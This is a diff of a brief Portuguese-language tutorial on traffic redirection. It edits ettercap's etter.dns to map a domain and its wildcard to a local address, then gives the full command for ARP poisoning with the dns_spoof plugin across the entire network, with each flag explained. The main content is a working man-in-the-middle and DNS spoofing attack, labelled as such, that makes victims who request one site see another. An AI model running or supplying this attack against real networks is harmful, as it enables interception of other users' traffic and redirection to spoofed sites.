@@ -1,15 +1,22 @@
+REDIRECIONAMENTO DE TRAFEGO
+
 1 - Configurar o arquivo de configuração ETTER.DNS
 1.1 - Caminho: nano /etc/ettercap/etter.dns
 
-Conteudo:
+Conteudo do ETTER.DNS:
+
 host1.tsc.example.com   A       192.168.0.197
 *tsc.example.com        A       192.168.0.197
 
 #host2.tsc.example.com   A       192.168.0.198
 #*tsc.example.com        A       192.168.0.198
 
+CTRL + S (SALVAR) e CTRL + X (SAIR)
 
+Comando para executar no terminal:
 ettercap -T -q -M arp -i wlp6s0 -P dns_spoof ///
+
+Entendendo o comando:
 
 ettercap: Comando da ferramenta utilizada.
 -T: Utiliza modo texto.
@@ -19,5 +26,6 @@ ettercap: Comando da ferramenta utilizada.
 -P dns_spoof: Plugin utilizado para o ataque.
 /// :  Seleciona toda rede.
 
+Estrutura simples:
 Site requisitado: SITE 1
 Site apresentado: SITE 2
